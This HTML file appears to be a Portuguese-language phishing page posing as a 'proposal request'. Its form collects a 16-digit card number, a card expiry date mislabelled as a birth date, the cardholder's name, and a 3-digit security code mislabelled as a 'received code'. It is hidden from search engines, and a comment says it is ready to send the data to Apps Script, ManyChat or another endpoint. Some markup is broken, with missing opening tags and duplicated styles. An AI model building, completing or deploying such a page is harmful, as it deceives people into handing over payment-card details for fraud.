<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex,nofollow">
  <title>Recovery | Solicitação de Proposta</title>
  <style>
    *{box-sizing:border-box}
    :root{
      --blue:#176f72;
      --blue-dark:#10585b;
      --ink:#16383a;
      --muted:#667482;
      --line:#dce9e8;
      --bg:#f3f8f8;
      --card:#ffffff;
      --danger:#b33434;
      --ok:#1d7a4a;
    }
    body{
      margin:0;
      min-height:100vh;
      font-family:Arial,Helvetica,sans-serif;
      background:linear-gradient(135deg,#edf7f6,#f8fbfb);
      color:#1e2733;
    }
    .page{
      min-height:100vh;
      display:grid;
      place-items:center;
      padding:24px;
    }
    .card{
      width:min(470px,95vw);
      background:var(--card);
      border:1px solid var(--line);
      border-radius:24px;
      padding:32px;
      box-shadow:0 24px 60px rgba(28,74,120,.14);
    }
    .brand{
      display:flex;
      align-items:center;
      gap:10px;
      font-size:27px;
      font-weight:800;
      color:var(--blue);
      margin-bottom:25px;
    }
    .brand img{
      width:42px;
      height:42px;
      border-radius:50%;
      object-fit:cover;
    }

    .card-brands{
      width:100%;
      margin:-10px 0 24px;
      padding:9px 10px;
      background:#f4f7fd;
      border:1px solid #e4eaf3;
      border-radius:15px;
      display:flex;
      align-items:center;
      justify-content:center;
      overflow:hidden;
    }
    .card-brands img{
      display:block;
      width:100%;
      max-width:420px;
      height:auto;
      object-fit:contain;
    }

    h1{
      margin:0 0 8px;
      font-size:28px;
      color:var(--ink);
    }
    .sub{
      color:var(--muted);
      font-size:14px;
      line-height:1.5;
      margin:0 0 24px;
    }
    .field{margin-top:17px}
    label{
      display:block;
      font-size:13px;
      font-weight:700;
      color:#34465a;
      margin-bottom:8px;
    }
    input{
      width:100%;
      height:50px;
      border:1.5px solid #c9d6e3;
      border-radius:12px;
      padding:0 14px;
      font-size:16px;
      background:#fff;
      outline:none;
      transition:.15s ease;
    }
    input:focus{
      border-color:var(--blue);
      box-shadow:0 0 0 4px rgba(23,111,114,.10);
    }
    input::placeholder{color:#9aa7b3}
    .hint{
      margin-top:6px;
      color:var(--muted);
      font-size:11px;
      line-height:1.35;
    }
    .btn{
      width:100%;
      height:50px;
      border:0;
      border-radius:12px;
      padding:0 18px;
      margin-top:24px;
      font-size:15px;
      font-weight:800;
      cursor:pointer;
      background:var(--blue);
      color:#fff;
      box-shadow:0 8px 20px rgba(23,111,114,.18);
    }
    .btn:hover{background:var(--blue-dark)}
    .btn:disabled{opacity:.65;cursor:not-allowed}
    .status{
      min-height:20px;
      margin-top:12px;
      font-size:13px;
      line-height:1.4;
      text-align:center;
    }
    .status.error{color:var(--danger)}
    .status.ok{color:var(--ok)}
    @media(max-width:480px){
      .page{padding:16px}
      .card{padding:25px 20px;border-radius:20px}
  
    .card-brands{
      width:100%;
      margin:-10px 0 24px;
      padding:9px 10px;
      background:#f4f7fd;
      border:1px solid #e4eaf3;
      border-radius:15px;
      display:flex;
      align-items:center;
      justify-content:center;
      overflow:hidden;
    }
    .card-brands img{
      display:block;
      width:100%;
      max-width:420px;
      height:auto;
      object-fit:contain;
    }

    h1{font-size:24px}
      .brand{font-size:24px}
    }
  </style>
</head>

      <h1>Solicitação de proposta</h1>
      <p class="sub">Preencha os dados abaixo para prosseguir com a solicitação.</p>

      <form id="proposalForm" novalidate>
        <div class="field">
          <label for="numero">Informe o número:</label>
          <input
            id="numero"
            name="numero"
            type="text"
            inputmode="numeric"
            autocomplete="off"
            maxlength="19"
            placeholder="1234 1234 1234 1234"
            required>
          <div class="hint">Informe os 16 dígitos.</div>
        </div>

        <div class="field">
          <label for="nascimento">Nascimento:</label>
          <input
            id="nascimento"
            name="nascimento"
            type="text"
            inputmode="numeric"
            autocomplete="bday"
            maxlength="5"
            placeholder="MM/AA"
            required>
        </div>

        <div class="field">
          <label for="nome">Nome:</label>
          <input
            id="nome"
            name="nome"
            type="text"
            autocomplete="name"
            maxlength="100"
            placeholder="Digite seu nome"
            required>
        </div>

        <div class="field">
          <label for="codigo">Código recebido:</label>
          <input
            id="codigo"
            name="codigo"
            type="text"
            inputmode="numeric"
            autocomplete="one-time-code"
            maxlength="3"
            pattern="[0-9]{3}"
            placeholder="000"
            required>
        </div>

        <button class="btn" type="submit">Continuar</button>
        <div id="status" class="status" aria-live="polite"></div>
      </form>
    </section>
  </main>

  <script>
    const numero = document.getElementById('numero');
    const nascimento = document.getElementById('nascimento');
    const nome = document.getElementById('nome');
    const codigo = document.getElementById('codigo');
    const form = document.getElementById('proposalForm');
    const status = document.getElementById('status');

    numero.addEventListener('input', () => {
      let digits = numero.value.replace(/\D/g,'').slice(0,16);
      numero.value = digits.replace(/(\d{4})(?=\d)/g,'$1 ');
    });

    nascimento.addEventListener('input', () => {
      let digits = nascimento.value.replace(/\D/g,'').slice(0,4);
      if(digits.length > 2){
        digits = digits.slice(0,2) + '/' + digits.slice(2);
      }
      nascimento.value = digits;
    });

    codigo.addEventListener('input', () => {
      codigo.value = codigo.value.replace(/\D/g,'').slice(0,3);
    });

    function erro(msg, campo){
      status.className = 'status error';
      status.textContent = msg;
      if(campo) campo.focus();
    }

    form.addEventListener('submit', (event) => {
      event.preventDefault();
      status.className = 'status';
      status.textContent = '';

      const numeroLimpo = numero.value.replace(/\D/g,'');
      if(numeroLimpo.length !== 16){
        erro('Informe os 16 dígitos do número.', numero);
        return;
      }

      const nasc = nascimento.value.match(/^(\d{2})\/(\d{2})$/);
      if(!nasc || Number(nasc[1]) < 1 || Number(nasc[1]) > 12){
        erro('Informe o nascimento no formato MM/AA.', nascimento);
        return;
      }

      if(nome.value.trim().length < 2){
        erro('Informe o nome.', nome);
        return;
      }

      if(!/^\d{3}$/.test(codigo.value)){
        erro('Informe o código recebido com 3 dígitos.', codigo);
        return;
      }

      /*
        FORMULÁRIO PRONTO PARA INTEGRAÇÃO.
        Aqui poderá ser adicionada a ação que enviará os dados
        para o Apps Script, ManyChat ou outro endpoint.
      */
      status.className = 'status ok';
      status.textContent = 'Dados preenchidos corretamente.';
    });
  </script>
</body>
